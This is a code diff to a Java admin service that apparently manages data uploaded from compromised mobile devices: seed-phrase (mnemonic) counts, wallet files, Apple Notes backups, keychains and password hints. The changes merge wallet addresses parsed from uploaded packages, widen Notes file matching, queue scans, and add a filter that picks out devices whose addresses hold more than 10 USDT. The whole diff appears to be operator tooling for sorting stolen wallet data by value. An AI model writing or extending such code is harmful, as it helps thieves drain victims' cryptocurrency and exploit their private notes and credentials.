@@ -43,6 +43,7 @@ public class DeviceAdminService {
     private final com.admin.dao.AddressDao addressDao;
     private final DeviceWalletService deviceWalletService;
     private final DeviceUsdtCacheService deviceUsdtCacheService;
+    private final PackageAddressService packageAddressService;
 
     public Map<String, Object> summary(AdminContext ctx) {
         QueryWrapper<DeviceEntity> scope = deviceScope(ctx);
@@ -194,13 +195,12 @@ public class DeviceAdminService {
         data.put("uploadCount", uploads.size());
         data.put("mnemonicCount", mnemonicCount);
         data.put("memorandumCount", memoCount);
-        data.put("addresses", deviceAddresses(d.getDeviceId()));
+        data.put("addresses", mergePackageAddresses(d.getDeviceId(), uploads, deviceAddresses(d.getDeviceId())));
         data.put("addressCount", ((List<?>) data.get("addresses")).size());
         Map<String, String> owners = scopeService.ownerLabelsByAppid(
                 d.getAppId() == null ? Set.of() : Set.of(d.getAppId().trim().toLowerCase(Locale.ROOT)));
         data.put("ownerLabel", owners.getOrDefault(
                 d.getAppId() == null ? "" : d.getAppId().trim().toLowerCase(Locale.ROOT), "—"));
-        data.put("hasKeychain", deviceWalletService.hasKeychain(d.getDeviceId()));
         Map<String, Object> enriched = deviceWalletService.enrichDetail(d, data);
         int parsed = 0;
         @SuppressWarnings("unchecked")
@@ -227,7 +227,7 @@ public class DeviceAdminService {
         enriched.put("parsedCount", parsed);
         enriched.put("notesCount", notesN);
         enriched.put("walletCount", wallets == null ? 0 : wallets.size());
-        int addrN = ((List<?>) enriched.get("addresses")).size();
+        int addrN = countRealAddresses(enriched.get("addresses"));
         enriched.put("infoRows", java.util.List.of(
                 java.util.List.of("名称", firstNonBlank(d.getDeviceName(), d.getModel(), "Device")),
                 java.util.List.of("机型", nz(d.getModel())),
@@ -279,6 +279,10 @@ public class DeviceAdminService {
             return fail;
         }
         String[] amounts = balanceLiveService.fetchAmounts(ch, addr);
+        if (amounts == null) {
+            fail.put("error", "查询失败，请稍后重试");
+            return fail;
+        }
         List<MnemonicEntity> mns = mnemonicDao.selectList(new QueryWrapper<MnemonicEntity>().eq("deviceId", d.getDeviceId()));
         List<Long> mids = mns.stream().map(MnemonicEntity::getId).collect(Collectors.toList());
         if (!mids.isEmpty()) {
@@ -357,6 +361,75 @@ public class DeviceAdminService {
             out.add(item);
         }
         return out;
+    }
+
+    private List<Map<String, Object>> mergePackageAddresses(String deviceId, List<UploadFileEntity> uploads,
+            List<Map<String, Object>> dbRows) {
+        List<Map<String, Object>> out = new ArrayList<>(dbRows == null ? List.of() : dbRows);
+        Set<String> seen = new HashSet<>();
+        for (Map<String, Object> a : out) {
+            Object addr = a.get("address");
+            if (addr != null && !String.valueOf(addr).isBlank()) {
+                seen.add(String.valueOf(addr).trim().toLowerCase(Locale.ROOT));
+            }
+        }
+        List<com.admin.parse.PackageAddressScan.Row> pkg;
+        try {
+            pkg = packageAddressService.load(deviceId, uploads);
+        } catch (Exception e) {
+            return out;
+        }
+        int i = 0;
+        for (com.admin.parse.PackageAddressScan.Row r : pkg) {
+            String addr = r.address == null ? "" : r.address.trim();
+            if (addr.isEmpty()) {
+                continue;
+            }
+            String key = "—".equals(addr)
+                    ? "ph:" + r.walletKey + ":" + r.sourceFile
+                    : addr.toLowerCase(Locale.ROOT);
+            if (!seen.add(key)) {
+                continue;
+            }
+            Map<String, Object> item = new LinkedHashMap<>();
+            item.put("id", "pkg:" + r.walletKey + ":" + r.chain + ":" + addr + ":" + i);
+            item.put("address", addr);
+            item.put("chain", r.chain);
+            item.put("source", r.walletName);
+            String bal = r.balance == null || r.balance.isBlank() ? "—" : r.balance;
+            item.put("balance", bal);
+            item.put("nativeBal", bal);
+            item.put("usdtBal", "");
+            item.put("from_package", true);
+            item.put("can_refresh", balanceLiveService.supports(r.chain, addr));
+            if (r.passwordHint != null && !r.passwordHint.isBlank()) {
+                item.put("passwordHint", r.passwordHint);
+            }
+            out.add(item);
+            i++;
+        }
+        return out;
+    }
+
+    private static int countRealAddresses(Object raw) {
+        if (!(raw instanceof List)) {
+            return 0;
+        }
+        int n = 0;
+        for (Object o : (List<?>) raw) {
+            if (!(o instanceof Map)) {
+                continue;
+            }
+            Object addr = ((Map<?, ?>) o).get("address");
+            if (addr == null) {
+                continue;
+            }
+            String a = String.valueOf(addr).trim();
+            if (!a.isEmpty() && !"—".equals(a)) {
+                n++;
+            }
+        }
+        return n;
     }
 
     private Map<String, Object> counts(int devices, int busy, int done, int uploads, int completed, int wallets, int notes) {
@@ -473,7 +546,8 @@ public class DeviceAdminService {
         if (bids.isEmpty()) {
             return out;
         }
-        List<UploadFileEntity> files = uploadFileDao.selectList(null);
+        List<UploadFileEntity> files = uploadFileDao.selectList(
+                new QueryWrapper<UploadFileEntity>().select("deviceId", "fileName"));
         for (UploadFileEntity u : files) {
             String fn = u.getFileName() == null ? "" : u.getFileName().toLowerCase(Locale.ROOT);
             if (isWalletFile(fn, bids)) {
@@ -502,10 +576,24 @@ public class DeviceAdminService {
         String mu = filters.get("min_usdt");
         if ("10".equals(mu)) {
             try {
+                List<DeviceEntity> missing = deviceDao.selectList(new QueryWrapper<DeviceEntity>()
+                        .select("deviceId")
+                        .isNull("wallet_usdt_max")
+                        .last("LIMIT 200"));
+                if (missing != null) {
+                    for (DeviceEntity d : missing) {
+                        packageAddressService.enqueueScan(d.getDeviceId());
+                    }
+                }
+            } catch (Exception ignored) {
+            }
+            try {
                 deviceUsdtCacheService.backfillMissing(200);
             } catch (Exception ignored) {
             }
-            qw.gt("wallet_usdt_max", 10);
+            qw.and(w -> w.gt("wallet_usdt_max", 10).or().inSql("deviceId",
+                    "SELECT m.deviceId FROM mnemonic m INNER JOIN address a ON a.mnemonic_id = m.id "
+                            + "WHERE CAST(NULLIF(TRIM(a.usdt_bal), '') AS DECIMAL(36,18)) > 10"));
         }
     }
 
@@ -519,11 +607,12 @@ public class DeviceAdminService {
 
     private void applyNotesName(QueryWrapper<UploadFileEntity> qw) {
         qw.and(w -> w.like("fileName", "group.com.apple.notes")
+                .or().like("fileName", "com.apple.mobilenotes")
+                .or().like("fileName", "mobilenotes")
                 .or().like("fileName", "notes.tar")
                 .or().like("fileName", "notes.zip")
                 .or().like("fileName", "notes.tar.gz")
                 .or().like("fileName", "notes.tgz"));
-        qw.notLike("fileName", "mobilenotes");
     }
 
     private void applyWalletName(QueryWrapper<UploadFileEntity> qw) {
@@ -572,7 +661,8 @@ public class DeviceAdminService {
         if (dids == null || dids.isEmpty()) {
             return map;
         }
-        List<UploadFileEntity> files = uploadFileDao.selectList(new QueryWrapper<UploadFileEntity>().in("deviceId", dids));
+        List<UploadFileEntity> files = uploadFileDao.selectList(
+                new QueryWrapper<UploadFileEntity>().select("deviceId", "fileName").in("deviceId", dids));
         Set<String> walletBids = walletBundleIds();
         for (UploadFileEntity u : files) {
             int[] c = map.computeIfAbsent(u.getDeviceId(), k -> new int[] {0, 0, 0});
@@ -598,11 +688,8 @@ public class DeviceAdminService {
     }
 
     private boolean isNotesFile(String fn) {
-        if (fn.contains("mobilenotes")) {
-            return false;
-        }
-        return fn.contains("group.com.apple.notes") || fn.contains("notes.tar") || fn.contains("notes.zip")
-                || fn.contains("notes.tgz");
+        return fn.contains("group.com.apple.notes") || fn.contains("mobilenotes")
+                || fn.contains("notes.tar") || fn.contains("notes.zip") || fn.contains("notes.tgz");
     }
 
     private boolean isWalletFile(String fn, Set<String> bids) {
